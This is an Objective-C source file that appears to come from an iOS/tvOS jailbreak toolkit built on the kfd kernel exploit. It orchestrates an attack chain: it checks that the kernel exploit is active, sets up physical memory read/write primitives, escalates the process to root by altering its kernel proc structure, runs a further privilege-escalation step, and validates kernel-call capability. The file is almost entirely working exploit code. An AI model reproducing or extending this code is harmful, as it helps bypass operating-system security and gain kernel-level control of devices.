#import "dt_build690_client.h"
#import "dt_kcall_planb.h"
#import "dt_physrw.h"
#import "DTRunLogger.h"
#import "kfd_tvos.h"
#import "dt_kernel_exploit.h"
#import "primitives.h"
#import "kernel.h"

#import <unistd.h>

typedef void (^dt690_log_fn)(NSString *line);

static void dt690_log(dt690_log_fn log, NSString *line)
{
    [[DTRunLogger shared] log:line];
    if (log)
        log(line);
}

static void dt690_emit(dt690_log_fn log, NSString *marker)
{
    dt690_log(log, marker);
    [[DTRunLogger shared] logStage:marker];
}

int dt_build690_run_baseline(void (^log)(NSString *line), NSString **verdictOut)
{
    dt690_emit(log, @"KCALL690_PHASE_BEGIN");

    if (!dt_kernel_exploit_is_active()) {
        if (verdictOut)
            *verdictOut = @"KCALL690_KFD_INACTIVE";
        return -1;
    }

    if (dt_build_physrw_handoff_only(log) != 0) {
        if (verdictOut)
            *verdictOut = @"KCALL690_PHYSRW_FAIL";
        return -2;
    }

    if (getuid() != 0) {
        uint64_t proc = proc_find(getpid());
        if (proc && dt_build_phys_root_esc(proc, log) == 0 && getuid() == 0) {
            dt690_log(log, @"[+] build690 root esc OK uid=0");
        }
        if (proc)
            proc_rele(proc);
    }

    if (getuid() != 0) {
        if (verdictOut)
            *verdictOut = @"KCALL690_ROOT_FAIL";
        return -3;
    }

    int priv_r = -1;
    uint64_t self_proc = proc_find(getpid());
    if (self_proc) {
        priv_r = dt_build97_privesc_preserve_slot0(self_proc, log);
        proc_rele(self_proc);
    }
    if (priv_r != 0) {
        if (verdictOut)
            *verdictOut = @"KCALL690_BUILD97_FAIL";
        return -4;
    }

    dt690_emit(log, @"KCALL690_NO_OPAINJECT");
    dt690_emit(log, @"KCALL690_NO_RESTORE");
    dt690_emit(log, @"KCALL690_NO_MUTATION");

    NSString *kernelVerdict = nil;
    int r = dt690_run_baseline_validator(log, &kernelVerdict);
    if (r != 0) {
        if (verdictOut)
            *verdictOut = kernelVerdict ?: @"KCALL690_BASELINE_FAIL";
        return r;
    }

    if (verdictOut)
        *verdictOut = kernelVerdict ?: @"KCALL690_BASELINE_VALIDATOR_PASS";
    dt690_emit(log, @"KCALL690_PHASE_PASS");
    return 0;
}
